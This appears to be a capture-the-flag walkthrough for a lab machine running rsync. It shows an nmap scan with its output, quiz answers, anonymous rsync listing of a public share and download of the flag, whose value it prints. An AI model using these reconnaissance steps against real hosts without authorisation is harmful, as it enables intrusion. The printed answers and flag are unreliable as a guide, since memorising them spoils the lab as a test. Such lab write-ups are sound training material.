Connect the VPN, spawn the VM.<br>
10.129.228.37

### TASK 1
What is the default port for rsync?
https://linux.die.net/man/1/rsync
https://en.wikipedia.org/wiki/Rsync

Answer: 873

### TASK 2

How many TCP ports are open on the remote host?
─# nmap -sS -n -Pn -sV --osscan-guess 10.129.228.37 -p- -sV               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 00:45 EST
Nmap scan report for 10.129.228.37
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1081.27 seconds

Answer: 1

### TASK 3

What is the protocol version used by rsync on the remote machine?
Answer: 31

### TASK 4

What is the most common command name on Linux to interact with rsync?
Answer: rsync

### Task 5
What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync
Answer: none

### TASK 6

What is the option to only list shares and files on rsync? (No need to include the leading -- characters)

```
rsync --help
```
Answer: list-only

### SUBMIT FLAG

Submit root flag

```
┌──(root㉿kali)-[~]
└─# rsync --list-only 10.129.228.37::      
public          Anonymous Share

┌──(root㉿kali)-[~]
└─# rsync --list-only 10.129.228.37::public
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt

┌──(root㉿kali)-[~]
└─# rsync 10.129.228.37::public/flag.txt /tmp/

┌──(root㉿kali)-[~]
└─# cat /tmp/flag.txt                                   
72eaf5344ebb84908ae543a719830519
```

Answer: 72eaf5344ebb84908ae543a719830519

